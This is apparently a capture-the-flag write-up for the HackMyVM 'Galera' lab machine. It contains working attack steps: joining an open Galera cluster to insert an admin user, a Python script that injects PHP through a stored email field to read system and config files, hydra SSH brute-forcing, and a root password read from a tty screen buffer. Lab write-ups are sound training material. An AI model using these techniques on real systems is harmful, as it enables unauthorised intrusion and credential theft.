# Galera

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.45:22
Open 10.0.2.45:80
Open 10.0.2.45:4567
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.45

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMXjSOeBye5caqfXn/iyv2x+3UsGpc3mXqjCesy2LF8V3IO7ce89FUeEqoqm7/lLogTsCeztnv9liPqfJ7plMPY=
|   256 f3:fa:a1:84:c6:da:fc:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINvTgWnXQRvN24haR+nU8va5KGiTjk6Zk6nC+5uJVZr2
80/tcp   open  http    syn-ack Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
4567/tcp open  tram?   syn-ack
```
:::

## Galera Cluster

According to [https://galeracluster.com/library/documentation/firewall-settings.html](https://galeracluster.com/library/documentation/firewall-settings.html)
- `4567` is reserved for Galera [Cluster Replication](https://galeracluster.com/library/documentation/glossary.html#term-cluster-replication) traffic. Multicast replication uses both TCP and UDP transport on this port.

Raw connection provides almost no information
```bash
└─$ nc galera.hmv 4567 | xxd
00000000: 2400 0002 d314 d464 0001 1000 f81d 9bc6  $......d........
00000010: 8a3d 11f0 852d 8f5a 6963 886c 54e7 1512  .=...-.Zic.lT...
```

Create Galera configuration and attempt to connect without credentials, if successful then it means it's misconfigured.
- [Configuring MariaDB Galera Cluster](https://mariadb.com/docs/galera-cluster/galera-management/configuration/configuring-mariadb-galera-cluster)
- [Galera Cluster Tutorial: Building a Highly Available Database System](https://youtu.be/S-nlKA_SmMc?t=194)
```bash
└─$ sudo nano /etc/mysql/conf.d/galera.cnf
[mysqld]
binlog_format = ROW
default_storage_engine = InnoDB

# Galera Provider Configuration
wsrep_on = ON
wsrep_provider = /usr/lib/galera/libgalera_smm.so

# Galera Cluster Configuration
wsrep_cluster_address = "gcomm://galera.hmv:4567"
wsrep_node_name = "letmein"
wsrep_node_address = "10.0.2.15"

# Galera Synchronization Configuration
wsrep_sst_method = rsync 
```

```bash
└─$ sudo systemctl restart mariadb
└─$ sudo mysql -u root
Server version: 10.11.6-MariaDB-2 Debian n/a
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| galeradb           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
MariaDB [(none)]> USE galeradb;
MariaDB [galeradb]> SHOW TABLES;
+--------------------+
| Tables_in_galeradb |
+--------------------+
| users              |
+--------------------+
MariaDB [galeradb]> SELECT * FROM users;
+----+----------+------------------+--------------------------------------------------------------+---------------------+
| id | username | email            | password                                                     | created_at          |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
|  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-04 19:55:51 |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
```

```bash
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
# Taking it's sweet time
```


We actually have ALL privileges on this database, hence we can insert new user or update admin's password.
```bash
MariaDB [galeradb]> SHOW GRANTS;
+-----------------------------------------------------------------------------------------------------------------------------------------+
| Grants for root@localhost                                                                                                               |
+-----------------------------------------------------------------------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` IDENTIFIED VIA mysql_native_password USING 'invalid' OR unix_socket WITH GRANT OPTION |
| GRANT PROXY ON ''@'%' TO 'root'@'localhost' WITH GRANT OPTION                                                                           |
+-----------------------------------------------------------------------------------------------------------------------------------------+
```

```bash
└─$ php -r 'echo password_hash("admin", PASSWORD_BCRYPT, ["cost"=>10]);'
$2y$10$xcHK2M8ADG8zxd.2J.HDluEUvLlfw2nbsuFvioI6QQ6Re4Of5eDEi

MariaDB [galeradb]> SELECT * FROM users;
+----+----------+------------------+--------------------------------------------------------------+---------------------+
| id | username | email            | password                                                     | created_at          |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
|  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-04 19:55:51 |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
MariaDB [galeradb]> INSERT INTO users (username, email, password) VALUES ('letmein', 'let@me.in', '$2y$10$xcHK2M8ADG8zxd.2J.HDluEUvLlfw2nbsuFvioI6QQ6Re4Of5eDEi');
MariaDB [galeradb]> SELECT * FROM users;
+----+----------+------------------+--------------------------------------------------------------+---------------------+
| id | username | email            | password                                                     | created_at          |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
|  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-04 19:55:51 |
| 14 | letmein  | let@me.in        | $2y$10$xcHK2M8ADG8zxd.2J.HDluEUvLlfw2nbsuFvioI6QQ6Re4Of5eDEi | 2025-09-05 08:00:39 |
+----+----------+------------------+--------------------------------------------------------------+---------------------+
```

> **Note**: If you fail to login in portal restart the (local) MariaDB service and then retry again, might be some cronjob restarting database.

## HTTP

There isn’t much to work with besides the login page. It does include a CSRF token, but the value is constant and never changes: `48f9e1909c3b41d55d6ecff40a2047a06edc8b073555e472e8ce40661cb4225a`

![writeup.png](/assets/pentest/hackmyvm/galera/writeup.png)

```bash
└─$ feroxbuster -u http://galera.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html -W 28
302      GET        0l        0w        0c http://galera.hmv/login.php => http://galera.hmv/
200      GET       26l       57w      825c http://galera.hmv/
200      GET        0l        0w        0c http://galera.hmv/config.php
200      GET       26l       57w      825c http://galera.hmv/index.php
200      GET      861l     4482w    77268c http://galera.hmv/info.php
302      GET        0l        0w        0c http://galera.hmv/logout.php => index.php
301      GET        9l       28w      309c http://galera.hmv/upload => http://galera.hmv/upload/
403      GET        1l        3w       21c http://galera.hmv/private.php
```

After tinkering with database we are ready to login with inserted credentials

![writeup-1.png](/assets/pentest/hackmyvm/galera/writeup-1.png)

### LFI

The email field when Viewed is vulnerable to code injection, craft a payload, insert into MySQL and when rendered it will trigger that PHP code.

```python
import mysql.connector
import bcrypt
from requests import Session
from bs4 import BeautifulSoup as BS
from random import randbytes
import sys

URL = 'http://galera.hmv'

def get_password_hash(password: bytes) -> str:
    return bcrypt.hashpw(password, bcrypt.gensalt(rounds=10)).decode()

def upsert_user(username: str, email: str, password: str, db: str) -> None:
    try:
        conn = mysql.connector.connect(host="localhost", user="root", password="Password123$", database=db)
        cursor = conn.cursor()
        query = (
            'INSERT INTO users (username, email, password)'
            'VALUES (%s, %s, %s)'
            'ON DUPLICATE KEY UPDATE email=VALUES(email), password=VALUES(password);'
        )
        cursor.execute(query, (username, email, password))
        conn.commit()

        print(f"User '{username}' inserted/updated successfully.")

    except mysql.connector.Error as err:
        print(f"Database error: {err}")
    finally:
        if 'cursor' in locals(): cursor.close()
        if 'conn' in locals() and conn.is_connected(): conn.close()


if __name__ == '__main__':
    USERNAME = PASSWORD = randbytes(8).hex()
    
    print(f'Creating Username: {USERNAME}, Password: {PASSWORD}')
    
    if len(sys.argv) > 1: 
        email = sys.argv[1]
    else:
        email = input('Email: ')
    
    email = '<?php {} ;?>'.format(email)
    upsert_user(USERNAME, email, get_password_hash(PASSWORD.encode()), 'galeradb')

    with Session() as session:
        resp = session.get(f'{URL}/login.php')
        token = BS(resp.text, 'html.parser').find('input', {'name': 'token'})['value']
        
        resp = session.post(
            f'{URL}/login.php',
            data={'user': USERNAME, 'pass': PASSWORD, 'token': token},
        )
        if resp.status_code != 200:
            print('Login failed')
            exit(1)

        session.post(f'{URL}/private.php', data={'view': '0', 'clear_log': '1'})
        session.post(f'{URL}/private.php', data={'view': '0', 'message': 'Whatever'})
        resp = session.get(f'{URL}/private.php', params={'view': '1'})
        html = BS(resp.text, 'html.parser')
        try:
            user = html.find('strong').text
        except AttributeError:
            print('Failed to sync, restart service;; sudo systemctl restart mariadb')
            exit(2)

        try:
            output = html.find('pre').text
        except AttributeError:
            output = 'No output'
            
        print(f'Email: {user}')
        print(output)
```

`/info.php` showed that almost all functions that allow code execution are blocked, including `include`. But AFAIK this cannot be blocked from PHP, so we still can read files using it:
```bash
└─$ py /media/sf_VBoxShare/t.py
Creating Username: 72f45068e1189cb7, Password: 72f45068e1189cb7
Email: include('/etc/passwd')
User '72f45068e1189cb7' inserted/updated successfully.
Email: <?php include('/etc/passwd') ;?>
root:x:0:0:root:/root:/bin/bash
...
donjuandeaustria:x:1000:1000:donjuandeaustria,,,:/home/donjuandeaustria:/bin/bash
...

└─$ py /media/sf_VBoxShare/t.py 'foreach(new SplFileObject("config.php") as$l)echo $l'
Creating Username: 6e362f02ef011f2d, Password: 6e362f02ef011f2d
User '6e362f02ef011f2d' inserted/updated successfully.
Email: <?php foreach(new SplFileObject("config.php") as$l)echo $l ;?>
...
// Database connection parameters
$host    = 'localhost';
$db      = 'galeradb';
$user    = 'galeradbusr';
$pass    = '8d7F4TnHRYQaGDjvwUpt';
$charset = 'utf8mb4';
...
└─$ py /media/sf_VBoxShare/t.py 'print_r(scandir("."))'
Creating Username: 5c263580b9d1ac20, Password: 5c263580b9d1ac20
User '5c263580b9d1ac20' inserted/updated successfully.
Email: <?php print_r(scandir(".")) ;?>
Array
(
    [0] => .
    [1] => ..
    [2] => config.php
    [3] => create_admin.php
    [4] => galera.png
    [5] => index.php
    [6] => info.php
    [7] => login.php
    [8] => logout.php
    [9] => messages.log
    [10] => private.php
    [11] => style.css
    [12] => upload
)
```

## SSH 

### Brute-force

No credentials were found in configurations so we can only assume we have to brute-force with this unusual username.
```bash
└─$ hydra -l donjuandeaustria -P $rockyou galera.hmv ssh
[22][ssh] host: galera.hmv   login: donjuandeaustria   password: amorcito
```

```bash
└─$ sshpass -p 'amorcito' ssh donjuandeaustria@galera.hmv
donjuandeaustria@galera:~$ id
uid=1000(donjuandeaustria) gid=1000(donjuandeaustria) groups=1000(donjuandeaustria),5(tty),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
donjuandeaustria@galera:~$ cat user.txt
072f9d8c26547db59e65d7aa3e55747b
```

## Privilege Escalation

```bash
donjuandeaustria@galera:~$ find . -type f -ls
132860      4 -rw-r--r--   1 donjuandeaustria donjuandeaustria     3558 May  7 23:48 ./.bashrc
    25   2028 -rw-r-----   1 root             tty               2074781 May  8 00:04 ./donjuandeaustria.png
164117      4 -rw-------   1 donjuandeaustria donjuandeaustria       20 May  8 00:12 ./.lesshst
162438      4 -rw-r--r--   1 donjuandeaustria donjuandeaustria      807 May  4 19:17 ./.profile
164112      4 -rw-r-----   1 root             donjuandeaustria       33 May  7 21:20 ./user.txt
162439      4 -rw-r--r--   1 donjuandeaustria donjuandeaustria      220 May  4 19:17 ./.bash_logout
```

Nothing from `strings`, `stegsolve`, `zsteg`, `exiftool` or `foremost`, just a picture..
```bash
└─$ sshpass -p 'amorcito' scp donjuandeaustria@galera.hmv:donjuandeaustria.png .
```

TTY group is odd to see: [https://wiki.archlinux.org/title/Users_and_groups#System_groups](https://wiki.archlinux.org/title/Users_and_groups#System_groups)

```bash
donjuandeaustria@galera:/var/www/html$ w
 13:47:36 up  8:12,  2 users,  load average: 0.02, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty20    -                05:34    8:12m  0.01s   ?    -bash
donjuand pts/0    10.0.2.15        13:32    1.00s  0.06s  0.02s w
donjuandeaustria@galera:/var/www/html$ cat /dev/tty20
cat: /dev/tty20: Permission denied
donjuandeaustria@galera:/var/www/html$ ls /dev/*20
/dev/tty20  /dev/vcs20  /dev/vcsa20  /dev/vcsu20
donjuandeaustria@galera:/var/www/html$ cat /dev/vcs20
...
Reminder: your root password is 'saG58zJxs8crgQa366Uw'
```

### Root.txt

```bash
root@galera:~# cat /root/root.txt
6a0d424c13321ca6e3b2deb2295fcc26
```

## P.S.

While going through writeups for this box, I noticed that [he110wor1d’s solution](https://www.cnblogs.com/ShowMeTheBug/p/18896058?utm_source=chatgpt.com) on HackMyVM took a different approach than most others. Instead of the usual methods, they demonstrated gaining a reverse shell using the [bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=chatgpt.com) technique. Pretty clever and an interesting alternative to the more common paths.



